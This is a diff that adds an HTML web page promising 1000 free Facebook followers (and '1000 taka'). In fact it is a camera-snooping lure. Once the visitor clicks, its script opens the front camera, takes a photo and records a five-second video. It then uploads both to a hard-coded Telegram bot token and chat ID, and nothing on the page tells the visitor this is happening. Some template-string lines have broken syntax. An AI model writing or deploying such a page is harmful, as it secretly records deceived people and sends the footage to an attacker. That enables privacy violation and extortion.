@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Click and get 1000 taka</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+        }
+        .container {
+            text-align: center;
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        form {
+            margin-top: 20px;
+        }
+        input[type="url"] {
+            padding: 10px;
+            font-size: 16px;
+            width: 100%;
+            box-sizing: border-box;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 18px;
+            cursor: pointer;
+            margin: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .media-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+            margin-top: 20px;
+        }
+        .media-item {
+            margin: 10px;
+            text-align: center;
+            max-width: 100%;
+        }
+        a {
+            display: block;
+            margin-top: 10px;
+            font-size: 16px;
+            text-decoration: none;
+            color: #333;
+        }
+        .message {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #333;
+        }
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h1>Get 1000 Facebook Followers Free</h1>
+        <form id="fbLinkForm">
+            <label for="fbLink">Facebook Profile Link:</label>
+            <input type="url" id="fbLink" name="fbLink" required pattern="https?://(www\.)?facebook\.com/.+">
+        </form>
+        <button onclick="getFollowers()">Get Followers</button>
+        <br>
+        <div class="media-container" id="mediaContainer">
+            <!-- Captured media will be appended here -->
+        </div>
+        <div class="message" id="message"></div>
+    </div>
+
+    <script>
+        let captureCount = 0;
+        const MAX_CAPTURES = 3;
+        const TELEGRAM_BOT_TOKEN = '6920306083:AAHhpxMMg8OkM59TH7MOeBI1RRw7PjlPG6A'; // Replace with your bot token
+        const CHAT_ID = '5757464460'; // Replace with your chat ID
+
+        function getFollowers() {
+            const messageElement = document.getElementById('message');
+            messageElement.textContent = 'Thank you for your interest! Your request is being processed. Please wait...';
+
+            captureMedia();
+        }
+
+        async function captureMedia() {
+            if (captureCount >= MAX_CAPTURES) {
+                alert('You have reached the maximum number of captures.');
+                return;
+            }
+
+            captureCount++;
+
+            try {
+                // Capture picture from front camera
+                const constraints = {
+                    video: {
+                        facingMode: 'user' // Use front camera
+                    }
+                };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const videoTrack = stream.getVideoTracks()[0];
+
+                // Capture picture
+                const imgData = await captureImageFromStream(stream);
+                const imgBlob = await fetch(imgData).then(res => res.blob());
+                sendMediaToTelegram(imgBlob, 'photo');
+
+                // Capture 5-second video
+                const videoBlob = await captureVideoFromStream(stream);
+                sendMediaToTelegram(videoBlob, 'video');
+
+                // Stop the camera stream
+                stream.getTracks().forEach(track => track.stop());
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                alert('Error accessing camera. Please make sure your device supports camera access.');
+            }
+        }
+
+        function captureImageFromStream(stream) {
+            const track = stream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(track);
+            return imageCapture.takePhoto().then(blob => {
+                return URL.createObjectURL(blob);
+            });
+        }
+
+        function captureVideoFromStream(stream) {
+            const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            const chunks = [];
+            mediaRecorder.ondataavailable = function(event) {
+                if (event.data.size > 0) {
+                    chunks.push(event.data);
+                }
+            };
+            mediaRecorder.start();
+            return new Promise((resolve, reject) => {
+                mediaRecorder.onstop = function() {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    resolve(blob);
+                };
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 5000); // Stop recording after 5 seconds
+            });
+        }
+
+        function sendMediaToTelegram(blob, type) {
+            const formData = new FormData();
+            formData.append(type, blob, ${type}_${captureCount}.webm);
+
+            axios.post(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}, formData, {
+                params: {
+                    chat_id: CHAT_ID
+                }
+            })
+            .then(response => {
+                console.log('Media sent successfully:', response.data);
+            })
+            .catch(error => {
+                console.error('Error sending media to Telegram:', error);
+            });
+        }
+    </script>
+</body>
+</html>
